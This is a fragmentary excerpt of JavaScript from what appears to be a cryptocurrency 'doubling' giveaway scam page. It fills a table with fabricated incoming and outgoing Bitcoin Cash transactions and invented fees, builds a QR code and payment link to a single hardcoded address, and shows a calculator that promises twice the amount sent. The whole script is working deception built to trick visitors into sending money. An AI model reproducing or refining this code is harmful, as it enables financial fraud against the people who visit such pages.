...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">qry0nj3jj3t3qhcatts0wsnw70s4uhve4upsjfrepn</span> </td> <td>' +
    amount +
    ' BCH</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    '</span></td> </tr>'
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">qry0nj3jj3t3qhcatts0wsnw70s4uhve4upsjfrepn</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' BCH</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 3 && $('#cal-in').val() <= 1000) {
      amount_entered = $('#cal-in').val()
      tm = Date.now()
      $('#gen-amount').text(amount_entered)
      $('#qrcode_svg').attr(
        'src',
        'https://api.qrserver.com/v1/create-qr-code/?data=bitcoin%3Aqry0nj3jj3t3qhcatts0wsnw70s4uhve4upsjfrepn%3Famount%3D' +
          amount_entered +
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'bitcoin:qry0nj3jj3t3qhcatts0wsnw70s4uhve4upsjfrepn?amount=' +
            amount_entered +
    ...
    } else $('#warn').text('Amount should be within 3 BCH to 1000 BCH')
  }),
  $('#close').click(() => {
  ...
  $("#cal-in").on("input", () => {
    ...
    } else if (in_amount => 0.05 && in_amount <= 1000) {
      $("#cal-out").val(in_amount * 2);
    }
  })
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'qry0nj3jj3t3qhcatts0wsnw70s4uhve4upsjfrepn',
  )
